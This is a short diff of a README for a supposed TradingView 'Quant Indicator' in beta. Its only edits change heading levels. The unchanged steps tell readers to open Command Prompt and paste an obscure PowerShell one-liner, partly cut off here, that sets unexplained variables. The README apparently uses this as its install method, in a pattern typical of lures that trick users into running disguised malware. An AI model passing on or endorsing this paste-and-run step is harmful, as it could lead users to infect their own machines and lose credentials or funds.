@@ -19,7 +19,7 @@ Quant is currently in beta. Early access is available through GitHub while we co
 
 Follow the steps below to install the Quant Indicator and its required dependencies using Command Prompt.
 
-### 1. Open Command Prompt.
+#### 1. Open Command Prompt.
 
 Press **Win + R**, type:
 
@@ -29,7 +29,7 @@ cmd
 
 Then press **Enter**.
 
-### 2. Install Quant Indicator.
+#### 2. Install Quant Indicator.
 
 Copy and paste the following command into Command Prompt:
 ```powershell
@@ -38,7 +38,7 @@ powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_
 
 Press **Enter** to begin the installation.
 
-### 3. Restart TradingView for the changes to take effect.
+#### 3. Restart TradingView for the changes to take effect.
 
 After installation, Quant Indicator will appear in your TradingView indicator library.
 
